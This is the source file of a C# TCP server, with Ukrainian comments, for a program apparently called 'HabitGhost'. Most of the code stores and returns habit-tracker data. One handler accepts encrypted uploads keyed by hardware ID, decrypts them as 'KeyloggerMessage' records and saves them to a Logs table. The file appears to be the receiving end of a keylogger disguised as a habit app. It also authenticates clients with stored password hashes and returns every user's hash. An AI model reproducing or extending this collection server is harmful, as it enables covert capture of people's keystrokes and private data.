using Dapper;
using Microsoft.Data.SqlClient;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.Json;
using TcpServer.Models;


public class HabitGhostServer
{
    private static readonly int port = 12345;
    private static readonly string connectionString = @"Server=VAG\SQLEXPRESS;Database=HabitGhostDB;Integrated Security=True;TrustServerCertificate=True;";
    private static readonly string allowedIP = "127.0.0.1";

    public void Start()
    {
        try
        {
            TcpListener server = new TcpListener(IPAddress.Any, port);
            server.Start();
            ServerLogger.Log($"[+] Server is running on port {port}");

            while (true)
            {
                TcpClient client = server.AcceptTcpClient();
                ThreadPool.QueueUserWorkItem(HandleClient, client);
            }
        }
        catch (Exception ex)
        {
            ServerLogger.Log("[!] Server startup error: " + ex.Message);
        }
    }

    private void HandleClient(object obj)
    {
        TcpClient client = (TcpClient)obj;
        string clientIP = ((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString();
        ServerLogger.Log($"[+] New connection with IP: {clientIP}");

        if (clientIP != allowedIP)
        {
            ServerLogger.Log($"[!] Connection from IP rejected: {clientIP}");
            client.Close();
            return;
        }

        NetworkStream stream = client.GetStream();
        byte[] buffer = new byte[4096];
        int bytesRead;

        try
        {
            bytesRead = stream.Read(buffer, 0, buffer.Length);
            string incomingText = Encoding.UTF8.GetString(buffer, 0, bytesRead);

            // якщо це JSON — обробляємо як ClientRequest
            if (incomingText.TrimStart().StartsWith("{"))
            {
                var request = JsonSerializer.Deserialize<ClientRequest>(incomingText);

                if (!ValidateAuth(request.UserId, request.Token, request.Hwid))
                {
                    ServerLogger.Log("[-] Authorization failed.");
                    client.Close();
                    return;
                }

                byte[] responseData;

                if (request.RequestType == "auth")
                {
                    responseData = Encoding.UTF8.GetBytes("[OK] Authenticated");
                    ServerLogger.Log($"[OK] Auth successful: UserID={request.UserId}");
                }
                else if (request.RequestType == "history")
                {
                    responseData = GetHabitTrackingBytes(request.UserId);
                }
                else if (request.RequestType == "goals")
                {
                    responseData = GetGoalsByUserId(request.UserId);
                }
                else // "data"
                {
                    SaveLogs(request);
                    SaveGoals(request);
                    SaveHabits(request);
                    SaveHabitTracking(request);
                    responseData = Encoding.UTF8.GetBytes("[OK] Data saved.");
                    ServerLogger.Log($"[OK] Data saved for UserID={request.UserId}");
                }


                stream.Write(responseData, 0, responseData.Length);
            }
            else
            {
                // Інакше — припускаємо, що це файл
                HandleRawEncryptedLog(incomingText, stream);
            }
        }
        catch (Exception ex)
        {
            ServerLogger.Log("[!] Client processing error: " + ex.Message);
        }
        finally
        {
            ServerLogger.Log($"[-] Connection with IP: {clientIP} completed");
            client.Close();
        }
    }

    private void HandleRawEncryptedLog(string headerLine, NetworkStream stream)
    {
        try
        {
            string[] parts = headerLine.Split(new[] { '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries);
            if (parts.Length < 2)
            {
                ServerLogger.Log("[!] Invalid log header (no HWID and filename)");
                return;
            }

            string hwid = parts[0].Trim();
            string fileName = parts[1].Trim();
            int? machineId = null;

            using (var conn = new SqlConnection(connectionString))
            {
                machineId = conn.ExecuteScalar<int?>(
                    "SELECT TOP 1 Id FROM Machines WHERE Hwid = @Hwid",
                    new { Hwid = hwid });
            }

            if (machineId == null)
            {
                ServerLogger.Log($"[!] HWID not registered: {hwid}");
                return;
            }

            using (MemoryStream ms = new MemoryStream())
            {
                byte[] buffer = new byte[4096];
                int read;

                // читаємо решту даних
                while ((read = stream.Read(buffer, 0, buffer.Length)) > 0)
                    ms.Write(buffer, 0, read);

                string allEncrypted = Encoding.UTF8.GetString(ms.ToArray());

                string[] lines = allEncrypted.Split(new[] { "\r\n", "\n" }, StringSplitOptions.RemoveEmptyEntries);

                foreach (var encryptedLine in lines)
                {
                    try
                    {
                        string decryptedJson = EncryptionHelperStatic.Decrypt(encryptedLine); // окремий клас
                        var msg = JsonSerializer.Deserialize<KeyloggerMessage>(decryptedJson);

                        SaveRawLogToDb(msg, machineId.Value);
                    }
                    catch (Exception ex)
                    {
                        ServerLogger.Log($"[!] Decrypt/Parse failed: {ex.Message}");
                    }
                }

                ServerLogger.Log($"[+] File log '{fileName}' processed successfully.");
            }
        }
        catch (Exception ex)
        {
            ServerLogger.Log($"[!] Error in HandleRawEncryptedLog: {ex.Message}");
        }
    }

    private void SaveRawLogToDb(KeyloggerMessage msg, int machineId)
    {
        try
        {
            using (var conn = new SqlConnection(connectionString))
            {
                conn.Execute(
                    "INSERT INTO Logs (MachineId, Content, LogTime) VALUES (@MachineId, @Content, @LogTime)",
                    new
                    {
                        MachineId = machineId,
                        Content = $"[{msg.Tag}] {msg.Message}",
                        LogTime = DateTime.Parse(msg.Timestamp)
                    });
            }
        }
        catch (Exception ex)
        {
            ServerLogger.Log("[!] Failed to insert log: " + ex.Message);
        }
    }

    private bool ValidateAuth(int userId, string token, string hwid)
    {
        try
        {
            using (var conn = new SqlConnection(connectionString))
            {
                string sql = @"
                    SELECT COUNT(*) FROM Users u
                    JOIN Machines m ON u.Id = m.UserId
                    WHERE u.Id = @UserId AND u.PasswordHash = @Token AND m.Hwid = @Hwid";

                int count = conn.ExecuteScalar<int>(sql, new { UserId = userId, Token = token, Hwid = hwid });
                return count > 0;
            }
        }
        catch (Exception ex)
        {
            ServerLogger.Log("[!] Authorization: error — " + ex.Message);
            return false;
        }
    }

    private void SaveHabits(ClientRequest request)
    {
        try
        {
            using (var conn = new SqlConnection(connectionString))
            {
                string sql = "INSERT INTO Habits (UserId, Title, Frequency, ReminderTime) VALUES (@UserId, @Title, @Frequency, @ReminderTime)";
                foreach (var habit in request.Habits)
                {
                    conn.Execute(sql, new
                    {
                        UserId = habit.UserId,
                        Title = habit.Title,
                        Frequency = habit.Frequency,
                        ReminderTime = habit.ReminderTime
                    });
                }
            }
        }
        catch (Exception ex)
        {
            ServerLogger.Log("[!] Saving habit: " + ex.Message);
        }
    }

    private void SaveLogs(ClientRequest request)
    {
        try
        {
            using (var conn = new SqlConnection(connectionString))
            {
                string sqlGetMachineId = "SELECT Id FROM Machines WHERE UserId = @UserId AND Hwid = @Hwid";
                int machineId = conn.ExecuteScalar<int>(sqlGetMachineId, new { request.UserId, request.Hwid });

                string sqlInsert = "INSERT INTO Logs (MachineId, Content, LogTime) VALUES (@MachineId, @Content, @LogTime)";
                foreach (var log in request.Logs)
                {
                    conn.Execute(sqlInsert, new
                    {
                        MachineId = machineId,
                        Content = log.Content,
                        LogTime = log.LogTime
                    });
                }
            }
        }
        catch (Exception ex)
        {
            ServerLogger.Log("[!] Saving logs: " + ex.Message);
        }
    }

    private void SaveGoals(ClientRequest request)
    {
        try
        {
            using (var conn = new SqlConnection(connectionString))
            {
                string sql = "INSERT INTO Goals (UserId, Title, Description, DueDate) VALUES (@UserId, @Title, @Description, @DueDate)";
                foreach (var goal in request.Goals)
                {
                    conn.Execute(sql, new
                    {
                        UserId = request.UserId,
                        Title = goal.Title,
                        Description = goal.Description,
                        DueDate = goal.DueDate
                    });
                }
            }
        }
        catch (Exception ex)
        {
            ServerLogger.Log("[!] Saving goals: " + ex.Message);
        }
    }

    private void SaveHabitTracking(ClientRequest request)
    {
        try
        {
            using (var conn = new SqlConnection(connectionString))
            {
                string sql = "INSERT INTO HabitTracking (HabitId, CompletionDate, IsCompleted) VALUES (@HabitId, @CompletionDate, @IsCompleted)";
                foreach (var ht in request.HabitTrackings)
                {
                    conn.Execute(sql, new
                    {
                        HabitId = ht.HabitId,
                        CompletionDate = ht.CompletionDate,
                        IsCompleted = ht.IsCompleted
                    });
                }
            }
        }
        catch (Exception ex)
        {
            ServerLogger.Log("[!] Saving HabitTracking: " + ex.Message);
        }
    }

    // ---------Отримання--------- 

    // Отримати логи користувача через MachineId
    public byte[] GetLogsByMachineID(int machineID)
    {
        try
        {
            using (var conn = new SqlConnection(connectionString))
            {
                var logs = conn.Query<Log>("SELECT * FROM Logs WHERE MachineId = @MachineId ORDER BY LogTime DESC", new { MachineId = machineID });
                return JsonSerializer.SerializeToUtf8Bytes(logs, new JsonSerializerOptions { WriteIndented = true });
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[!] Failed to fetch logs for MachineID {machineID}: {ex.Message}");
            return null;
        }
    }

    // Отримати користувача через MachineId
    public int GetUserIdByMachineId(int machineId)
    {
        try
        {
            using (var conn = new SqlConnection(connectionString))
            {
                int userId = conn.ExecuteScalar<int>("SELECT UserId FROM Machines WHERE Id = @MachineId", new { MachineId = machineId });
                return userId;
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[!] Failed to get UserId for MachineID {machineId}: {ex.Message}");
            return -1;
        }
    }

    // Отримати цілі через UserId
    public byte[] GetGoalsByUserId(int userId)
    {
        try
        {
            using (var conn = new SqlConnection(connectionString))
            {
                var goals = conn.Query<Goal>("SELECT * FROM Goals WHERE UserId = @UserId", new { UserId = userId });
                return JsonSerializer.SerializeToUtf8Bytes(goals, new JsonSerializerOptions { WriteIndented = true });
            }
        }
        catch (Exception ex)
        {
            ServerLogger.Log("[!] Getting goals: " + ex.Message);
            return null;
        }
    }

    // Отримати звички через UserId
    public byte[] GetHabitsByUserId(int userId)
    {
        try
        {
            using (var conn = new SqlConnection(connectionString))
            {
                string sql = @"
                SELECT Id, UserId, Title, Frequency, ReminderTime
                FROM Habits
                WHERE UserId = @UserId";

                var habits = conn.Query<Habit>(sql, new { UserId = userId });
                return JsonSerializer.SerializeToUtf8Bytes(habits, new JsonSerializerOptions { WriteIndented = true });
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("[!] Error getting user habits: " + ex.Message);
            return null;
        }
    }

    // Отримати історію звичок через UserId
    public byte[] GetHabitTrackingBytes(int userId)
    {
        try
        {
            using (var conn = new SqlConnection(connectionString))
            {
                string sql = @"
                    SELECT ht.TrackingId, ht.HabitId, ht.CompletionDate, ht.IsCompleted
                    FROM HabitTracking ht
                    JOIN Habits h ON ht.HabitId = h.Id
                    WHERE h.UserId = @UserId";

                var history = conn.Query<HabitTracking>(sql, new { UserId = userId });
                return JsonSerializer.SerializeToUtf8Bytes(history, new JsonSerializerOptions { WriteIndented = true });
            }
        }
        catch (Exception ex)
        {
            ServerLogger.Log("[!] Getting habit trackings: " + ex.Message);
            return null;
        }
    }

    // Отримати усіх клієнтів
    public List<User> GetAllUsers()
    {
        try
        {
            using (var conn = new SqlConnection(connectionString))
            {
                string sql = "SELECT Id, Username, Mail, PasswordHash FROM Users";
                return conn.Query<User>(sql).AsList();
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("[!] Error getting list of clients: " + ex.Message);
            return new List<User>();
        }
    }

}
